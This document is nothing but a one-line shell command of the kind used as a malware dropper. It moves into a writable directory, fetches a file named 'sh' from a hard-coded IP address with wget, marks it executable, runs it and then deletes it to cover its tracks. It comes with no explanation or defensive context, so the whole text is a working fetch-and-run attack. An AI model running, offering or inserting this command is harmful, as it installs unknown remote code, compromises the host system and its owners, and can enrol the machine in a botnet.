cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.139/sh; chmod +x sh; ./sh; rm -rf sh
